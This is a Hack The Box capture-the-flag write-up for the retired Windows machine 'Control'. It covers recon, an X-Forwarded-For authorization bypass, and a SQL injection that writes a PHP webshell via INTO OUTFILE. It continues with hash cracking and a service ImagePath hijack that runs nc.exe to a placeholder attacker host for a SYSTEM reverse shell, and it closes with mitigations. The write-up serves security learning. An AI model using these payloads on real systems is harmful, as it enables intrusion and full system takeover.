---
machine: Control
os: Windows
difficulty: Hard
platform: Hack The Box
state: Retired
tags: [windows, web, iis, sqli, mysql, services, privesc]
---

# Control — Hack The Box (Windows)

[🇪🇸 Español](README.md) | **English**

> **State:** Retired. Reference writeup; no real flags or credentials.

## TL;DR

`admin.php` trusts `X-Forwarded-For` for authorization and then concatenates `productName` into SQL. A UNION with the `FILE` privilege writes a webshell into IIS, and MySQL hashes pivot to `hector`. Escalation changes the binary path of a service any authenticated user can start.

## Recon

```bash
nmap -Pn -sCV -p80,135,3306 <IP>
```

- `80/tcp` IIS 10 with a corporate site and a protected `admin.php`.
- `135/tcp` RPC and `3306/tcp` MariaDB, which rejects external connections.
- The page source includes a comment with the internal IP `192.168.4.28`.

## Enumeration

- Adding `X-Forwarded-For: 192.168.4.28` returns `admin.php` instead of the proxy error.
- `productName=Asus'` triggers a SQL error; a six-column `UNION SELECT` returns data.
- The `manager` user has the `FILE` privilege, enough to write into `C:/inetpub/wwwroot`.

## Foothold

Write a PHP webshell with `INTO OUTFILE` and run it as `nt authority\iusr`.

```bash
curl -H 'X-Forwarded-For: 192.168.4.28'   --data-urlencode "productName=Asus' UNION SELECT '<?php system($_GET[cmd]); ?>',2,3,4,5,6 INTO OUTFILE 'c:/inetpub/wwwroot/_x.php'#"   http://<IP>/admin.php
curl 'http://<IP>/_x.php?cmd=whoami'
```

## Lateral movement

Dump the `mysql.user` hashes and crack `hector`'s. `hector` is a member of Remote Management Users, so use `Invoke-Command` to run commands as him and obtain a WinRM or Netcat shell.

## Privilege escalation

Any authenticated user can write service keys. Find services with `RP` for `AU` in the SDDL and `ObjectName=LocalSystem`, replace `ImagePath` with Netcat and start the service.

```powershell
sc sdshow <SERVICE>
Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Services\<SERVICE> -Name ImagePath -Value "C:\Windows\Temp\nc.exe -e cmd <ATTACKER> 443"
Start-Service <SERVICE>
```

## Evidence

- `admin.php` reachable with `X-Forwarded-For`.
- Webshell as `iusr` and cracked `hector` hash.
- Service with a modified `ImagePath` and a SYSTEM shell.

## Lessons learned

- An HTTP header is not an authentication mechanism.
- The `FILE` privilege turns SQL injection into web execution.
- Write access to service keys enables lateral movement and SYSTEM.

## Mitigation and detection

- Do not trust `X-Forwarded-For`; use real authentication and a trusted proxy.
- Use parameterized queries and revoke `FILE` from the application user.
- Restrict writes to `HKLM\SYSTEM\CurrentControlSet\Services` and audit `ImagePath` changes.

## References

- [0xdf — Control](https://0xdf.gitlab.io/2020/04/25/htb-control.html)
- [IppSec — Control](https://www.youtube.com/watch?v=kFfYHmLmwVc)
- [Hack The Box — Control](https://app.hackthebox.com/machines/control)
